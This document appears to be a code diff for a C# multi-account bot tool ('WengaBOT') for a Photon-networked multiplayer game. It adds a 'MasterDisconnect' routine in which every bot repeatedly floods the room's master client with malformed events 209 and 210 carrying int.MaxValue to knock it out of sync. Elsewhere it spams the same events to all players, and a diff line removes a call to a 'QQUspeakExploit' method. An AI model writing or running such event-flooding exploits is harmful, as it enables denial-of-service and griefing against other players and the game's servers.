@@ -181,22 +181,17 @@ namespace TheBotUI {
                     botInstancesList.Items.Clear();
                     playerList.Items.Clear();
                 }
-                
-                Thread.Sleep(2000);
-                {
-                    Console.ForegroundColor
-                    = ConsoleColor.Green;
-                    Console.WriteLine("API Cleaned");
-                    botInstancesList.Items.Clear();
-                    playerList.Items.Clear();
-                }
+                Thread.Sleep(1000);
                 {
                     Console.ForegroundColor
                     = ConsoleColor.Blue;
-                    Console.WriteLine("Fully Cleaned");
+                    Console.WriteLine("Lists Cleaned");
                     botInstancesList.Items.Clear();
                     playerList.Items.Clear();
                 }
+                Console.ForegroundColor
+                    = ConsoleColor.DarkGreen;
+                Console.WriteLine("Fully Cleaned");
                 string[] authdata = File.ReadAllLines("Auth/AuthNormal.txt");
                 foreach (string login in authdata)
                 {
@@ -284,7 +279,7 @@ namespace TheBotUI {
                             {
                                 var bot = (Bot)item.Tag;
                                 bot.PhotonClient.OpRaiseEvent(210, new int[] { int.MaxValue, bot.PhotonClient.LocalPlayer.ActorNumber }, new RaiseEventOptions() { Receivers = ReceiverGroup.All }, SendOptions.SendReliable);
-                                bot.PhotonClient.OpRaiseEvent(209, new int[] { int.MaxValue, bot.PhotonClient.LocalPlayer.ActorNumber }, new RaiseEventOptions() { Receivers = ReceiverGroup.All }, SendOptions.SendReliable);
+                                bot.PhotonClient.OpRaiseEvent(209, new int[] { int.MaxValue, bot.PhotonClient.LocalPlayer.ActorNumber }, new RaiseEventOptions() { Receivers = ReceiverGroup.All}, SendOptions.SendReliable);
                             }
                         });
                         Thread.Sleep(2000);
@@ -404,7 +399,6 @@ namespace TheBotUI {
 
         private void button5_Click(object sender, EventArgs e)
         {
-          //  for (; ; )
             new Thread(() =>
             {
                 for (; ; )
@@ -414,7 +408,6 @@ namespace TheBotUI {
                     if (bot.PhotonClient.InRoom)
                     {
                         Thread.Sleep(500);
-                        bot.QQUspeakExploit(Convert.ToByte(textBox1.Text));
                     }
                 }   
                 
@@ -1024,6 +1017,38 @@ namespace TheBotUI {
                 Console.WriteLine(isJoined ? "[WengaBOT] Successfully joined to room!" : "[WengaBOT] JoinOrCreateRoom failed!");
                 Thread.Sleep(3000);
                 bot.PhotonClient.InstantiateSelf();
+            }
+        }
+
+        private void MasterDisconnect_Click(object sender, EventArgs e)
+        {
+            if (selectedBot.PhotonClient.InRoom)
+            {
+                new Thread(() =>
+                {
+                    Console.ForegroundColor
+                        = ConsoleColor.DarkRed;
+                    Console.WriteLine("[WengaBOT] Started Desync on Master");
+                    for (int ii = 0; ii < 20; ii++)
+                    {
+                        100.EventSpammer(5, () =>
+                        {
+                            Desync = true;
+                            foreach (ListViewItem item in botInstancesList.Items)
+                            {
+                                var bot = (Bot)item.Tag;
+                                bot.PhotonClient.OpRaiseEvent(210, new int[] { int.MaxValue, bot.PhotonClient.LocalPlayer.ActorNumber }, new RaiseEventOptions() { Receivers = ReceiverGroup.MasterClient }, SendOptions.SendReliable);
+                                bot.PhotonClient.OpRaiseEvent(209, new int[] { int.MaxValue, bot.PhotonClient.LocalPlayer.ActorNumber }, new RaiseEventOptions() { Receivers = ReceiverGroup.MasterClient }, SendOptions.SendReliable);
+                            }
+                        });
+                        Thread.Sleep(2000);
+                    }
+                    Console.ForegroundColor
+                        = ConsoleColor.DarkGreen;
+                    Console.WriteLine("[WengaBOT] Masterclient Desynced");
+                    Desync = false;
+                })
+                { IsBackground = true }.Start();
             }
         }
     }
